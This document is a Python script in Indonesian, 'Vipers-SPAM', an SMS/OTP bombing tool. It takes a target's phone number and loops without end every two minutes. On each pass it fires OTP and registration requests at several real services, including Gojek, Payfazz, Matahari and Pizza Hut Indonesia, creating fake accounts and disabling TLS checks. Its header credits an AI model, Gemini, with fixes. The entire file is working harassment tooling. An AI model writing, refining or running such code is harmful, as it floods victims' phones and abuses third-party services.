# -*- coding: utf-8 -*-

# ================================================================= #
#  Vipers-SPAM - Versi Final untuk Ubuntu/Linux                     #
#  Author Asli: Ricky Khairul Faza                                  #
#  Re-code: Dhaniels 1704                                           #
#  Perbaikan & Penyempurnaan: Gemini                                #
# ================================================================= #

import sys
import os
import time
import random
import json
import requests
import urllib3
from bs4 import BeautifulSoup as bs

# Menonaktifkan peringatan InsecureRequestWarning
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# --- Inisialisasi Warna untuk Terminal ---
hijau   =   "\033[1;92m"
putih   =   "\033[1;97m"
abu     =   "\033[1;90m"
kuning  =   "\033[1;93m"
ungu    =   "\033[1;95m"
merah   =   "\033[1;91m"
biru    =   "\033[1;96m"
reset   =   "\033[0m"


# --- Fungsi Bantuan ---

def autoketik(s):
    """Mencetak teks karakter per karakter untuk efek mengetik."""
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.02)

def countdown(time_sec):
    """Menampilkan hitung mundur di terminal."""
    while time_sec:
        mins, secs = divmod(time_sec, 60)
        timeformat = f'{putih}[{kuning}•{putih}] Silakan Menunggu Dalam {hijau}{mins:02d}:{secs:02d}{putih}'
        print(timeformat, end='\r')
        time.sleep(1)
        time_sec -= 1
    print(" " * 50, end="\r") # Membersihkan baris countdown

def clear_screen():
    """Membersihkan layar terminal, kompatibel untuk Windows dan Linux/Ubuntu."""
    os.system('cls' if os.name == 'nt' else 'clear')

# --- Fungsi Inti Spam ---

def jam(nomor):
    """Fungsi utama yang mengirimkan spam ke nomor target."""
    autoketik(f"{hijau}Program Spam Dimulai! Target: {putih}{nomor}{reset}")
    b = nomor.lstrip('0')
    c = "62" + b
    
    # Daftar URL API untuk spam.
    # Anda bisa menambahkan atau mengurangi daftar ini sesuai kebutuhan.
    api_list = [
        lambda: requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{nomor}', timeout=10, verify=False),
        lambda: requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0','Authorization':'Basic QjMzOkZSMzM='},data=json.dumps({"number":"+"+c}), timeout=10, verify=False),
        lambda: requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+b},headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False),
        lambda: requests.post(f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={nomor}", headers={'User-Agent': 'Mozilla/5.0'}, timeout=10, verify=False),
        lambda: requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"User-Agent":"Mozilla/5.0"},data=json.dumps({"otp_request":{"mobile_number":nomor,"mobile_country_code":"+62"}}), timeout=10, verify=False),
        lambda: requests.post("https://api.gojekapi.com/v5/customers", data={"email": f"spambot{random.randint(1000,9999)}@gmail.com", "name": "Spam Bot", "phone":c, "signed_up_country": "ID"},headers={"X-AppVersion": "4.50.1", "X-UniqueId": f"{random.randint(1000000, 9999999)}", "User-Agent": "okhttp/3.12.1", "X-Platform": "Android"}, timeout=10, verify=False),
        lambda: requests.post("https://api-prod.pizzahut.co.id/customer/v1/customer/register", headers={'user-agent': 'Mozilla/5.0'},data=json.dumps({  "email": f"spambot{random.randint(1000,9999)}@gmail.com",  "first_name": "Spam",  "last_name": "Bot",  "password": f"Rahasia{random.randint(100,999)}",  "phone": "0"+b,  "birthday": "2000-01-02"}), timeout=10, verify=False)
    ]
    
    sukses_count = 0
    gagal_count = 0
    
    random.shuffle(api_list)

    for i, api_call in enumerate(api_list):
        try:
            response = api_call()
            if 200 <= response.status_code < 300:
                print(f"{putih}[{hijau}{i+1:02d}/{len(api_list)}{putih}] {hijau}SUKSES {putih}- Status: {response.status_code}")
                sukses_count += 1
            else:
                print(f"{putih}[{merah}{i+1:02d}/{len(api_list)}{putih}] {merah}GAGAL {putih}- Status: {response.status_code}")
                gagal_count += 1
        except requests.exceptions.RequestException:
            print(f"{putih}[{merah}{i+1:02d}/{len(api_list)}{putih}] {merah}ERROR {putih}- Gagal menghubungi server.")
            gagal_count += 1
        time.sleep(1.5)

    autoketik(f"\n{kuning}Siklus Selesai. {hijau}Sukses: {sukses_count}, {merah}Gagal: {gagal_count}{reset}")


def start_spam_loop():
    """Mengelola seluruh siklus program: banner, input, dan loop spam."""
    clear_screen()
    autoketik(f"{merah}SELAMAT DATANG DI {putih}Vipers-SPAM {merah}(Versi Final){reset}")
    print(f"""{putih}┌──────────────────────────────────────────────┐
│ {biru}•{putih} {kuning}Author      :{putih} Ricky Khairul Faza         │
│ {biru}•{putih} {kuning}Re-code     :{putih} Dhaniels 1704              │
│ {biru}•{putih} {kuning}Github      :{putih} github.com/dhaniels1704      │
│ {biru}•{putih} {kuning}Instagram   :{putih} instagram.com/vip.ramdhani   │
└──────────────────────────────────────────────┘{reset}""")

    while True:
        nomor_input = input(f"{hijau}Masukkan Nomor Target (contoh: 0812...): {putih}")
        if nomor_input.isdigit() and 10 <= len(nomor_input) <= 14:
            nomor = nomor_input
            break
        else:
            print(f"{merah}[!] Nomor tidak valid. Harap masukkan nomor telepon Indonesia yang benar.{putih}")
    
    is_first_run = True
    while True:
        if not is_first_run:
            autoketik(f"{kuning}Siklus berikutnya akan dimulai dalam 2 menit...{reset}")
            countdown(120)
        
        clear_screen()
        
        if is_first_run:
            autoketik(f"{merah}SPAM TANPA BATAS ke {putih}{nomor} {hijau}Siap Dimulai!{reset}")
            is_first_run = False
        else:
            autoketik(f"{merah}Mengulang Spam ke Nomor : {putih}{nomor}...{reset}")
        
        jam(nomor)

# --- Blok Eksekusi Utama ---

if __name__ == "__main__":
    try:
        start_spam_loop()
    except KeyboardInterrupt:
        print("\n")
        autoketik(f"""{merah}Program dihentikan oleh pengguna.
{hijau}-- Keluar Dari Tools --{reset}""")
        sys.exit()
    except Exception as e:
        print(f"\n{merah}Terjadi kesalahan yang tidak terduga: {e}{reset}")
        sys.exit()
